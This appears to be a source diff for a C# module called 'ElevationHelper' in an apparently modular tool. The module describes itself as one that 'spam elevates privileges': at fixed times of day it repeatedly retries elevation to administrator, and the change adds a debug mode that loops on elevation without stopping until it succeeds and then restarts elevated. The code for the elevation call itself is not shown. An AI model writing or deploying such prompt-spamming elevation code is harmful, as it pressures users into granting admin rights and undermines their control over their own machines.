@@ -13,7 +13,7 @@ namespace zort
     {
         private readonly Thread _elevThread = new Thread(TimedElevate);
 
-        public bool RequiresAdmin => false;
+        public ElevationType ElevationType => ElevationType.NonElevated;
         public string ModuleName => "ElevationHelper";
         public string ModuleDescription => "Spam elevates privileges at scheduled times.";
         public void Start()
@@ -60,46 +60,62 @@ namespace zort
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error elevating process: {ex.Message}");
+                ModuleLogger.Log(typeof(ElevationHelper), $"Error elevating process: {ex.Message}");
                 return false;
             }
 
+            Environment.Exit(0); // Exit the current process to avoid running the same instance again
             return true;
         }
 
         public static void TimedElevate()
         {
-            var now = DateTime.Now;
-            var timesToElevate = new List<TimeSpan>
+            const bool DEBUG_DONT_WAIT = true;
+            if (DEBUG_DONT_WAIT)
+            {
+                ModuleLogger.Log(typeof(ElevationHelper), "DEBUG: Skipping timed elevation.");
+
+                var didElevate = false;
+
+                while (!didElevate)
                 {
-                    new TimeSpan(9, 15, 0),
-                    new TimeSpan(10, 5, 0),
-                    new TimeSpan(10, 55, 0),
-                    new TimeSpan(11, 45, 0),
-                    new TimeSpan(12, 35, 0),
-                    new TimeSpan(13, 35, 0),
-                    new TimeSpan(14, 15, 0),
-                    new TimeSpan(15, 5, 0)
-                };
-
-            var nextTime = timesToElevate.FirstOrDefault(t => t > now.TimeOfDay);
-            if(nextTime == default) nextTime = timesToElevate.First();
-            var waitTime = (nextTime - now.TimeOfDay).TotalMilliseconds;
-
-            if (waitTime < 0)
-            {
-                waitTime += TimeSpan.FromDays(1).TotalMilliseconds;
+                    didElevate = TryElevate();
+                }
             }
-
-            Console.WriteLine($"Waiting for {waitTime / 1000 / 60:F2} mins until next elevation time: {nextTime}");
-            Thread.Sleep((int)waitTime);
-
-            var didElevate = false;
-            var timeout = nextTime.Add(new TimeSpan(0, 5, 0));
-
-            while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
+            else
             {
-                didElevate = TryElevate();
+                var now = DateTime.Now;
+                var timesToElevate = new List<TimeSpan>
+                    {
+                        new TimeSpan(9, 15, 0),
+                        new TimeSpan(10, 5, 0),
+                        new TimeSpan(10, 55, 0),
+                        new TimeSpan(11, 45, 0),
+                        new TimeSpan(12, 35, 0),
+                        new TimeSpan(13, 35, 0),
+                        new TimeSpan(14, 15, 0),
+                        new TimeSpan(15, 5, 0)
+                    };
+
+                var nextTime = timesToElevate.FirstOrDefault(t => t > now.TimeOfDay);
+                if (nextTime == default) nextTime = timesToElevate.First();
+                var waitTime = (nextTime - now.TimeOfDay).TotalMilliseconds;
+
+                if (waitTime < 0)
+                {
+                    waitTime += TimeSpan.FromDays(1).TotalMilliseconds;
+                }
+
+                ModuleLogger.Log(typeof(ElevationHelper), $"Waiting for {waitTime / 1000 / 60:F2} mins until next elevation time: {nextTime}");
+                Thread.Sleep((int)waitTime);
+
+                var didElevate = false;
+                var timeout = nextTime.Add(new TimeSpan(0, 5, 0));
+
+                while (!didElevate && DateTime.Now.TimeOfDay <= timeout)
+                {
+                    didElevate = TryElevate();
+                }
             }
         }
     }
